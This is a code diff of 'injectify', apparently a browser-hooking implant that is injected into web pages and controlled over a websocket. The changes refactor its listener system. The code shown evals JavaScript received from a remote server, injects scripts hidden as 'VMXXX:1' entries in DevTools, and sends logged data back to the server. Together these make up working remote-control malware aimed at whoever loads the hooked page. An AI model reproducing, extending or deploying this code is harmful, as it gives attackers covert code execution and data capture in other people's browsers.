@@ -8,15 +8,27 @@ declare var client: any
 
 window['injectify'] = class Injectify {
 	/**
-	 * Listen for a topic from websocket connection
-	 * @param {string} topic Topic name to listen to
-	 * @param {function} callback Callback to be triggered once topic received
+	 * Overrides the message handler for the websocket connection
+	 * @param {function} callback Callback to be triggered once message received
 	 */
-	static listen(topic, callback) {
+	static listener(callback) {
 		ws.onmessage = message => {
 			try {
 				let data = JSON.parse(message.data)
-				if (topic == data.t || topic == '*') {
+				if (this['listeners'] && data.t && this['listeners'][data.t]) {
+					/**
+					 * Pre-process some topic's data
+					 */
+					if (data.t == 'pong') {
+						data.d = +new Date - data.d
+					}
+					
+					/**
+					 * Callback the listeners
+					 */
+					this['listeners'][data.t].callback(data.d)
+					if (this['listeners'][data.t].once) delete this['listeners'][data.t]
+				} else {
 					callback(data.d, data.t)
 				}
 			} catch(e) {
@@ -26,11 +38,44 @@ window['injectify'] = class Injectify {
 		}
 	}
 	/**
+	 * Listen for a topic from websocket connection
+	 * @param {string} topic Topic name to listen to
+	 * @param {function} callback Callback to be triggered once topic received
+	 */
+	static listen(topic: string, callback, once?: boolean) {
+		if (!once) once = false
+		if (!this['listeners']) this['listeners'] = {}
+		this['listeners'][topic] = {
+			callback: data => {
+				callback(data)
+			},
+			raw: callback,
+			once: once
+		}
+	}
+	/**	
+	 * Unhook a websocket topic listener
+	 * @param {string} topic Topic name to unlisten
+	 * @param {function} callback
+	 */
+	static unlisten(topic: string, callback?: any) {
+		if (!this['listeners'] ||
+			!this['listeners'][topic] ||
+			!this['listeners'][topic].callback ||
+			!this['listeners'][topic].raw ||
+			(
+				callback &&
+				callback.toString() !== this['listeners'][topic].raw.toString()
+			)
+		) return false
+		return delete this['listeners'][topic]
+	}
+	/**
 	 * Send data to websocket
 	 * @param {string} topic Message topic
 	 * @param {Object} data Message data
 	 */
-	static send(topic, data?: any) {
+	static send(topic: string, data?: any) {
 		// If the websocket is dead, return
 		if (ws.readyState == 0) return
 		try {
@@ -48,7 +93,7 @@ window['injectify'] = class Injectify {
 	 * @param {(Object|string)} message Data to be logged
 	 * @param {boolean} local Whether to log it in the local console
 	 */
-	static log(message, local?: boolean) {
+	static log(message: any, local?: boolean) {
 		this.send('r', message)
 		if (local) console.log(message)
 	}
@@ -58,7 +103,7 @@ window['injectify'] = class Injectify {
 	 */
 	static ping(callback?: any) {
 		this.send('ping', + new Date())
-		if (callback) this.listen('pong', callback)
+		if (callback) this.listen('pong', callback, true)
 	}
 	/**
 	 * Safely execute a script with hidden context. Appears as 'VMXXX:1' in DevTools
@@ -67,6 +112,7 @@ window['injectify'] = class Injectify {
 	 */
 	static exec(func, targetParent?: any) {
 		if (!targetParent) targetParent = document.head
+		if (typeof func == 'function') func = '(' + func.toString() + ')()'
 		var script = document.createElement('script')
 		script.innerHTML = func
 		targetParent.appendChild(script)
@@ -128,7 +174,7 @@ if (window['injectify'].debug) {
 /**
  * Replace the basic websocket handler with a feature-rich one
  */
-window['injectify'].listen('*', (data, topic) => {
+window['injectify'].listener((data, topic) => {
 	try {
 		if (topic == 'error') {
 			console.error(data)
@@ -145,7 +191,9 @@ window['injectify'].listen('*', (data, topic) => {
 			delete window["callbackFor" + Module]
 			return
 		}
-		eval(data)
+		if (topic == 'execute' || topic == 'core') {
+			eval(data)
+		}
 	} catch(e) {
 		//if (JSON.stringify(e) == "{}") e = e.stack
 		if (window['injectify'].debug) {
